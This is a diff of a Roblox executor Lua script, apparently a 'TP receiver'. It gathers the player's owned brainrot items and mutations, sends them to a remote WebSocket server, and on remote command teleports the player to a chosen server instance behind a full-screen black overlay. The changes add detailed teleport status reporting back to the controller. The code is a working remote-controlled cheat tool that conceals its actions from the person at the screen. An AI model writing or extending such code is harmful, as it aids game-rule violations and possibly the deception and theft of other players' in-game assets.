@@ -13,6 +13,31 @@ local connect =
 assert(connect, "No WebSocket API found")
 
 local activeBlackGui
+local teleportAttempt = 0
+local teleportBegan = false
+
+local function trim(value)
+    return tostring(value or ""):match("^%s*(.-)%s*$")
+end
+
+local function makeBlackGui()
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "TPBlackScreen"
+    gui.IgnoreGuiInset = true
+    gui.ResetOnSpawn = false
+    gui.DisplayOrder = 2147483647
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+    local black = Instance.new("Frame")
+    black.Name = "Black"
+    black.Size = UDim2.fromScale(1, 1)
+    black.BackgroundColor3 = Color3.new(0, 0, 0)
+    black.BorderSizePixel = 0
+    black.ZIndex = 100
+    black.Parent = gui
+
+    return gui
+end
 
 local function hideBlackTeleportScreen()
     if activeBlackGui then
@@ -24,26 +49,15 @@ local function hideBlackTeleportScreen()
 end
 
 local function showBlackTeleportScreen()
+    if activeBlackGui and activeBlackGui.Parent then
+        return
+    end
+
     hideBlackTeleportScreen()
 
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "TPBlackScreen"
-    gui.IgnoreGuiInset = true
-    gui.ResetOnSpawn = false
-    gui.DisplayOrder = 2147483647
-    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
-    local black = Instance.new("Frame")
-    black.Name = "Black"
-    black.Size = UDim2.fromScale(1, 1)
-    black.Position = UDim2.fromScale(0, 0)
-    black.BackgroundColor3 = Color3.new(0, 0, 0)
-    black.BackgroundTransparency = 0
-    black.BorderSizePixel = 0
-    black.ZIndex = 100
-    black.Parent = gui
-
+    local gui = makeBlackGui()
     local parent
+
     if gethui then
         local ok, result = pcall(gethui)
         if ok and result then
@@ -54,12 +68,16 @@ local function showBlackTeleportScreen()
     parent = parent or LocalPlayer:WaitForChild("PlayerGui")
     gui.Parent = parent
     activeBlackGui = gui
+end
 
-    pcall(function()
-        TeleportService:SetTeleportGui(gui:Clone())
+local function prepareRobloxTeleportGui()
+    local ok, err = pcall(function()
+        TeleportService:SetTeleportGui(makeBlackGui())
     end)
 
-    return gui
+    if not ok then
+        warn("[TP RECEIVER] SetTeleportGui failed:", err)
+    end
 end
 
 local OWNER_ATTRS = {
@@ -77,8 +95,7 @@ local BRAINROT_ATTRS = {
     "AnimalName",
     "Brainrot",
     "BrainrotName",
-    "__Animal",
-    "DisplayName"
+    "__Animal"
 }
 
 local MUTATION_ATTRS = {
@@ -86,21 +103,49 @@ local MUTATION_ATTRS = {
     "Mutation"
 }
 
-local GENERIC_MODEL_NAMES = {
-    model = true,
-    animal = true,
-    brainrot = true,
-    rig = true,
-    root = true,
-    main = true,
-    podium = true,
-    slot = true,
-    holder = true,
-    display = true
+local BAD_NAMES = {
+    ["model"] = true,
+    ["animal"] = true,
+    ["brainrot"] = true,
+    ["rig"] = true,
+    ["root"] = true,
+    ["main"] = true,
+    ["podium"] = true,
+    ["slot"] = true,
+    ["holder"] = true,
+    ["display"] = true,
+    ["claim"] = true,
+    ["base"] = true,
+    ["button"] = true,
+    ["buttons"] = true,
+    ["platform"] = true,
+    ["floor"] = true,
+    ["sign"] = true,
+    ["prompt"] = true,
+    ["spawn"] = true,
+    ["pivot"] = true
 }
 
-local function trim(value)
-    return tostring(value or ""):match("^%s*(.-)%s*$")
+local function usableName(value)
+    local name = trim(value)
+    if name == "" then
+        return false
+    end
+
+    local lower = name:lower()
+
+    if BAD_NAMES[lower] then
+        return false
+    end
+
+    if lower:find("podium", 1, true)
+        or lower:find("claim", 1, true)
+        or lower:find("slot", 1, true)
+        or lower:find("button", 1, true) then
+        return false
+    end
+
+    return true
 end
 
 local function valueMatchesLocalPlayer(value)
@@ -131,20 +176,22 @@ local function objectNamesLocalPlayer(obj)
 
     for _, childName in ipairs(OWNER_ATTRS) do
         local child = obj:FindFirstChild(childName)
-        if child then
-            if child:IsA("StringValue")
-                or child:IsA("IntValue")
-                or child:IsA("NumberValue")
-                or child:IsA("ObjectValue") then
-                if valueMatchesLocalPlayer(child.Value) then
-                    return true
-                end
+
+        if child and (
+            child:IsA("StringValue")
+            or child:IsA("IntValue")
+            or child:IsA("NumberValue")
+            or child:IsA("ObjectValue")
+        ) then
+            if valueMatchesLocalPlayer(child.Value) then
+                return true
             end
         end
     end
 
     if obj:IsA("TextLabel") or obj:IsA("TextButton") then
         local text = tostring(obj.Text or ""):lower()
+
         if text:find(LocalPlayer.Name:lower(), 1, true)
             or text:find(LocalPlayer.DisplayName:lower(), 1, true) then
             return true
@@ -157,7 +204,6 @@ end
 local function groupBelongsToLocalPlayer(podiums)
     local current = podiums
 
-    -- Check the podium group and several base ancestors first.
     for _ = 1, 7 do
         if not current then
             break
@@ -170,19 +216,12 @@ local function groupBelongsToLocalPlayer(podiums)
         current = current.Parent
     end
 
-    -- Many bases expose the owner on a sign/label next to AnimalPodiums.
     local base = podiums.Parent
     if not base then
         return false
     end
 
-    local checked = 0
     for _, obj in ipairs(base:GetDescendants()) do
-        checked += 1
-        if checked > 700 then
-            break
-        end
-
         if objectNamesLocalPlayer(obj) then
             return true
         end
@@ -191,62 +230,12 @@ local function groupBelongsToLocalPlayer(podiums)
     return false
 end
 
-local function firstAttributeInTree(root, attributeNames)
-    for _, attrName in ipairs(attributeNames) do
-        local value = root:GetAttribute(attrName)
+local function attrValue(obj, names)
+    for _, name in ipairs(names) do
+        local value = obj:GetAttribute(name)
+
         if value ~= nil and trim(value) ~= "" then
             return trim(value)
-        end
-    end
-
-    for _, obj in ipairs(root:GetDescendants()) do
-        for _, attrName in ipairs(attributeNames) do
-            local value = obj:GetAttribute(attrName)
-            if value ~= nil and trim(value) ~= "" then
-                return trim(value)
-            end
-        end
-    end
-
-    return nil
-end
-
-local function firstStringValueInTree(root, names)
-    for _, name in ipairs(names) do
-        local obj = root:FindFirstChild(name, true)
-        if obj and obj:IsA("StringValue") and trim(obj.Value) ~= "" then
-            return trim(obj.Value)
-        end
-    end
-
-    return nil
-end
-
-local function getBrainrotName(slot)
-    local name = firstAttributeInTree(slot, BRAINROT_ATTRS)
-        or firstStringValueInTree(slot, {
-            "Animal",
-            "AnimalName",
-            "Brainrot",
-            "BrainrotName"
-        })
-
-    if name and name ~= "" then
-        return name
-    end
-
-    -- Fallback: choose a non-generic descendant model name.
-    for _, obj in ipairs(slot:GetDescendants()) do
-        if obj:IsA("Model") then
-            local candidate = trim(obj.Name)
-            local lower = candidate:lower()
-
-            if candidate ~= ""
-                and not GENERIC_MODEL_NAMES[lower]
-                and not lower:find("podium", 1, true)
-                and not lower:find("slot", 1, true) then
-                return candidate
-            end
         end
     end
 
@@ -254,24 +243,133 @@ local function getBrainrotName(slot)
 end
 
 local function getMutation(slot)
-    local mutation = firstAttributeInTree(slot, MUTATION_ATTRS)
-        or firstStringValueInTree(slot, MUTATION_ATTRS)
+    local value = attrValue(slot, MUTATION_ATTRS)
 
-    if not mutation or mutation == "" then
+    if not value then
+        for _, obj in ipairs(slot:GetDescendants()) do
+            value = attrValue(obj, MUTATION_ATTRS)
+
+            if value then
+                break
+            end
+        end
+    end
+
+    if not value then
         return nil
     end
 
-    if mutation:lower() == "normal" or mutation:lower() == "none" then
+    local lower = value:lower()
+
+    if lower == "normal" or lower == "none" then
         return nil
     end
 
-    return mutation
+    return value
+end
+
+local function getBrainrotName(slot)
+    -- 1) Exact game-data attributes are strongest.
+    local value = attrValue(slot, BRAINROT_ATTRS)
+    if value and usableName(value) then
+        return value
+    end
+
+    for _, obj in ipairs(slot:GetDescendants()) do
+        value = attrValue(obj, BRAINROT_ATTRS)
+
+        if value and usableName(value) then
+            return value
+        end
+    end
+
+    -- 2) Exact named StringValues.
+    for _, valueName in ipairs({
+        "Animal",
+        "AnimalName",
+        "Brainrot",
+        "BrainrotName"
+    }) do
+        local obj = slot:FindFirstChild(valueName, true)
+
+        if obj and obj:IsA("StringValue") and usableName(obj.Value) then
+            return trim(obj.Value)
+        end
+    end
+
+    -- 3) Prefer the model carrying the mutation attribute, since that is
+    -- normally the spawned brainrot model rather than Claim/Base slot parts.
+    for _, obj in ipairs(slot:GetDescendants()) do
+        if obj:GetAttribute("__Mutation") ~= nil
+            or obj:GetAttribute("Mutation") ~= nil then
+
+            local current = obj
+
+            for _ = 1, 6 do
+                if not current or current == slot then
+                    break
+                end
+
+                if current:IsA("Model") and usableName(current.Name) then
+                    return current.Name
+                end
+
+                current = current.Parent
+            end
+        end
+    end
+
+    -- 4) Score descendant models and reject known slot/UI models.
+    local bestName
+    local bestScore = -1
+
+    for _, obj in ipairs(slot:GetDescendants()) do
+        if obj:IsA("Model") and usableName(obj.Name) then
+            local score = 1
+
+            if obj:GetAttribute("__Mutation") ~= nil
+                or obj:GetAttribute("Mutation") ~= nil then
+                score += 20
+            end
+
+            if attrValue(obj, BRAINROT_ATTRS) then
+                score += 30
+            end
+
+            local partCount = 0
+            local hasHumanoid = obj:FindFirstChildOfClass("Humanoid") ~= nil
+            local hasRoot = obj:FindFirstChild("HumanoidRootPart", true) ~= nil
+
+            for _, desc in ipairs(obj:GetDescendants()) do
+                if desc:IsA("BasePart") then
+                    partCount += 1
+                end
+            end
+
+            if hasHumanoid then
+                score += 8
+            end
+
+            if hasRoot then
+                score += 6
+            end
+
+            score += math.min(partCount, 8)
+
+            if score > bestScore then
+                bestScore = score
+                bestName = obj.Name
+            end
+        end
+    end
+
+    return bestName
 end
 
 local function collectOwnBaseItems()
-    -- Optional exact override if you already know the game's current base format.
     if getgenv and type(getgenv().TPGetStuff) == "function" then
         local ok, custom = pcall(getgenv().TPGetStuff)
+
         if ok and type(custom) == "table" then
             return custom
         end
@@ -284,7 +382,7 @@ local function collectOwnBaseItems()
             for _, slot in ipairs(obj:GetChildren()) do
                 local brainrotName = getBrainrotName(slot)
 
-                if brainrotName then
+                if brainrotName and usableName(brainrotName) then
                     rawItems[#rawItems + 1] = {
                         name = brainrotName,
                         mutation = getMutation(slot)
@@ -292,12 +390,10 @@ local function collectOwnBaseItems()
                 end
             end
 
-            -- Stop after the receiver's own base is found.
             break
         end
     end
 
-    -- Combine exact duplicates so the sender can see quantities.
     local order = {}
     local counts = {}
 
@@ -368,6 +464,22 @@ local function send(data)
     end
 end
 
+local function sendTPStatus(status, extra)
+    local payload = {
+        type = "tp_status",
+        username = LocalPlayer.Name,
+        status = status
+    }
+
+    if type(extra) == "table" then
+        for key, value in pairs(extra) do
+            payload[key] = value
+        end
+    end
+
+    send(payload)
+end
+
 local function register(kind)
     send({
         type = kind or "register",
@@ -376,6 +488,45 @@ local function register(kind)
         items = collectOwnBaseItems()
     })
 end
+
+pcall(function()
+    LocalPlayer.OnTeleport:Connect(function(state, placeId, spawnName)
+        teleportBegan = true
+
+        local stateName = tostring(state):gsub("^Enum%.TeleportState%.", "")
+
+        if stateName == "Failed" then
+            hideBlackTeleportScreen()
+        else
+            showBlackTeleportScreen()
+        end
+
+        sendTPStatus("teleport_state", {
+            state = stateName,
+            placeId = placeId,
+            spawnName = spawnName
+        })
+    end)
+end)
+
+TeleportService.TeleportInitFailed:Connect(function(player, teleportResult, errorMessage, placeId)
+    if player ~= LocalPlayer then
+        return
+    end
+
+    teleportBegan = false
+    hideBlackTeleportScreen()
+
+    local resultName = tostring(teleportResult):gsub("^Enum%.TeleportResult%.", "")
+
+    warn("[TP RECEIVER] TeleportInitFailed:", resultName, errorMessage)
+
+    sendTPStatus("failed", {
+        result = resultName,
+        error = tostring(errorMessage or ""),
+        placeId = placeId
+    })
+end)
 
 local function handleMessage(message)
     local success, data = pcall(function()
@@ -407,24 +558,66 @@ local function handleMessage(message)
     end
 
     local placeId = tonumber(data.placeId)
-    local jobId = tostring(data.jobId or "")
+    local jobId = trim(data.jobId)
 
-    if not placeId or jobId == "" then
-        warn("[TP RECEIVER] Invalid teleport request")
+    if not placeId or placeId <= 0 or jobId == "" then
+        sendTPStatus("failed", {
+            error = "Invalid PlaceId or JobId"
+        })
         return
     end
 
-    showBlackTeleportScreen()
-    task.wait()
+    teleportAttempt += 1
+    local thisAttempt = teleportAttempt
+    teleportBegan = false
+
+    sendTPStatus("received", {
+        placeId = placeId,
+        jobId = jobId
+    })
+
+    prepareRobloxTeleportGui()
+
+    sendTPStatus("requesting", {
+        placeId = placeId,
+        jobId = jobId
+    })
 
     local tpOk, tpErr = pcall(function()
-        TeleportService:TeleportToPlaceInstance(placeId, jobId, LocalPlayer)
+        TeleportService:TeleportToPlaceInstance(
+            placeId,
+            jobId,
+            LocalPlayer
+        )
     end)
 
     if not tpOk then
         hideBlackTeleportScreen()
-        warn("[TP RECEIVER] Teleport failed:", tpErr)
+
+        sendTPStatus("failed", {
+            error = tostring(tpErr),
+            placeId = placeId,
+            jobId = jobId
+        })
+        return
     end
+
+    sendTPStatus("request_call_returned", {
+        placeId = placeId,
+        jobId = jobId
+    })
+
+    task.delay(3, function()
+        if teleportAttempt == thisAttempt and not teleportBegan then
+            hideBlackTeleportScreen()
+
+            sendTPStatus("no_start", {
+                error = "Roblox did not enter a teleport state after the request",
+                placeId = placeId,
+                jobId = jobId
+            })
+        end
+    end)
 end
 
 if ws.OnMessage then
